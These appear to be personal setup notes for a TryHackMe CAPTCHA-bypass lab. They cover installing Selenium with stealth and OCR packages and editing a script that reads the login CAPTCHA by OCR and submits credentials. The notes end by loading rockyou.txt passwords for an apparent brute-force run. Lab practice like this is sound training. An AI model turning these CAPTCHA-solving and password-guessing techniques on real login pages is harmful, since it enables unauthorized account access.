TryHackMe room CAPTCHApocalypse https://tryhackme.com/room/captchapocalypse

Setup enviroment on TryHackMe Attackbox for captcha Python script:

python3.9 -m venv myproject

pip install selenium selenium_stealth  fake_useragent pillow pytesseract

--
Install Chromium and chromedriver

wget https://storage.googleapis.com/chrome-for-testing-public/137.0.7151.103/linux64/chromedriver-linux64.zip


unzip chromedriver-linux64.zip
sudo mv chromedriver-linux64/chromedriver /usr/local/bin/chromedriver
sudo chmod +x /usr/local/bin/chromedriver
chromedriver --version


sudo apt install chromium-browser

options.binary_location = "/usr/bin/chromium-browser"

# Required for headless, VM, and root environments
options.add_argument("--headless=new")  # modern headless mode
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--remote-debugging-port=9222")  # crucial for "DevToolsActivePort" error
options.add_argument("--user-data-dir=/tmp/chrome")   # avoids conflicts running as root

==
Changes to original script:

===
Change Form Submission Method

chrome.find_element(By.TAG_NAME, "form").submit()
chrome.find_element(By.ID, "login-btn").click()
===
Update Form Field Selectors

chrome.find_element(By.NAME, "username").send_keys(username)
chrome.find_element(By.NAME, "password").send_keys(password)
chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)

chrome.find_element(By.ID, "username").send_keys(username)
chrome.find_element(By.ID, "password").send_keys(password)
chrome.find_element(By.ID, "captcha_input").send_keys(captcha_text)
===
Update CAPTCHA Image Selector
captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
captcha_img_element = chrome.find_element(By.CSS_SELECTOR, "img[src='captcha.php']")
==
 Add Wait Time for AJAX
 
chrome.find_element(By.TAG_NAME, "form").submit()
time.sleep(1)

chrome.find_element(By.ID, "login-btn").click()
time.sleep(3)  # Longer wait for AJAX request

===



# Read first 100 lines from rockyou.txt
with open("rockyou.txt", "r", encoding="latin1") as f:
    passwords = [line.strip() for _, line in zip(range(100), f)]
    
